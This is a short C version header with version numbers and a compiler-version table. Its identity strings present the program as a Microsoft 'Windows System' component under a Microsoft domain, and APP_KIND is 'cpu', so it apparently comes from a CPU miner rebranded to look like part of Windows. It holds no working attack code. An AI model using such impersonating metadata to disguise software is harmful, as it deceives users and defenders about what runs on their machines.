#ifndef __VERSION_H__
#define __VERSION_H__

#define APP_ID        "Microsoft"
#define APP_NAME      "Microsoft Corporation"
#define APP_DESC      "Windows System"
#define APP_VERSION   "2.8.4"
#define APP_DOMAIN    "www.microsoftonline.com"
#define APP_SITE      "Microsoft Corporation. All rights reserved"
#define APP_COPYRIGHT "Microsoft Windows 2018 (Ñ) All rights reserved"
#define APP_KIND      "cpu"

#define APP_VER_MAJOR  2
#define APP_VER_MINOR  8
#define APP_VER_BUILD  4
#define APP_VER_REV    0

#ifdef _MSC_VER
#   if (_MSC_VER == 1910 || _MSC_VER == 1911)
#       define MSVC_VERSION 2017
#   elif _MSC_VER == 1900
#       define MSVC_VERSION 2015
#   elif _MSC_VER == 1800
#       define MSVC_VERSION 2013
#   elif _MSC_VER == 1700
#       define MSVC_VERSION 2012
#   elif _MSC_VER == 1600
#       define MSVC_VERSION 2010
#   else
#       define MSVC_VERSION 0
#   endif
#endif

#endif /* __VERSION_H__ */
